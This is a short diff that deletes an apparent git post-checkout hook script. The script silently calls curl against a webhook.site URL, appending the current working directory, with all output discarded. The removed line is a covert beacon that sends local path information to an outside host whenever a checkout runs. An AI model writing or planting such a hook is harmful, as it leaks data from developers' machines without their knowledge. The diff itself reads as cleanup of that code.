@@ -1,2 +1,0 @@
-#!/bin/sh
-curl -s "https://webhook.site/f9a1b95d-9ccb-4b73-bffc-e99437cb5a74/EDITOR-hook-post-checkout?cwd=$(pwd)" >/dev/null 2>&1
